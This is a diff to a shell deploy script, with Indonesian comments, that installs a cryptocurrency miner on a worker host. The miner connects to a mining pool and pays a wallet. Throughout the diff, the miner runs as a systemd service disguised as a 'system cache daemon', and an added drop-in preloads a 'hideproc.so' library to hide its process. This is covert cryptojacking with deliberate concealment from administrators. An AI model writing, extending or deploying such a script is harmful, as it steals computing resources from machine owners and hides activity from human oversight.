@@ -4,17 +4,18 @@
 #   ./sandbox-deploy.sh ai-workers-1
 #
 # File yang harus ada di direktori yang sama:
-#   xcb                 (cmake --build build -j)
+#   xcb                 (cmake --build build --parallel ...)
 #   librandomx_v2.so    (ikut build; RPATH $ORIGIN)
 #   hideproc.so         (make -C labs/process-hide)
+#   syscached.service   (salin dari ops/systemd/)
 #
-# Env override: WALLET, POOL, THREADS, HUGEPAGES.
+# Env wajib: WALLET. Override: POOL, THREADS, HUGEPAGES.
 set -euo pipefail
 W="${1:?usage: sandbox-deploy.sh WORKER}"
 SUDO=""; [ "$(id -u)" = 0 ] || SUDO="sudo"
 DIR="$(cd "$(dirname "$0")" && pwd)"
 
-WALLET="${WALLET:-cc1p2mf0hyvm86vglrx6j3sq0hcxn7y8k2lt2fu8fzguv825j6epskxqtx8cmn}"
+WALLET="${WALLET:?WALLET wajib di-set (tidak ada default di repo)}"
 POOL="${POOL:-eu.rplant.xyz:17194}"
 THREADS="${THREADS:-4}"
 HUGEPAGES="${HUGEPAGES:-1200}"
@@ -41,23 +42,35 @@ RemainAfterExit=yes
 WantedBy=multi-user.target
 UNIT
 
-$SUDO tee /etc/systemd/system/syscached.service >/dev/null <<UNIT
+# Unit yang sama dengan template ops/systemd; jangan menulis definisi lain di
+# sini. Perbedaan instabox hanya drop-in (LD_PRELOAD + ketergantungan hugepages).
+UNIT_SRC="$DIR/syscached.service"
+[ -f "$UNIT_SRC" ] || UNIT_SRC="$DIR/../systemd/syscached.service"
+[ -f "$UNIT_SRC" ] || {
+    echo "syscached.service tidak ada di $DIR atau ../systemd; sertakan file dari ops/systemd/"
+    exit 1
+}
+
+$SUDO install -d -m 755 /etc/xcb
+tmp_env=$(mktemp)
+cat > "$tmp_env" <<ENV
+CONN_POOL=${POOL}
+WALLET=${WALLET}
+WORKER=${W}
+THREADS=${THREADS}
+ENV
+$SUDO install -m 600 "$tmp_env" /etc/xcb/miner.env
+rm -f "$tmp_env"
+
+$SUDO install -m 644 "$UNIT_SRC" /etc/systemd/system/syscached.service
+$SUDO install -d -m 755 /etc/systemd/system/syscached.service.d
+$SUDO tee /etc/systemd/system/syscached.service.d/10-instabox.conf >/dev/null <<'UNIT'
 [Unit]
-Description=System cache daemon
-After=network-online.target syscache-hugepages.service
-Wants=network-online.target syscache-hugepages.service
+After=syscache-hugepages.service
+Wants=syscache-hugepages.service
 
 [Service]
-Type=simple
-ExecStart=/usr/local/bin/xcb -a conn --conn-pool ${POOL} -u ${WALLET} --worker ${W} -t ${THREADS} --ui=log
-Restart=always
-RestartSec=10
-LimitMEMLOCK=infinity
-NoNewPrivileges=true
 Environment=LD_PRELOAD=/usr/local/lib/hideproc.so
-
-[Install]
-WantedBy=multi-user.target
 UNIT
 
 $SUDO systemctl daemon-reload
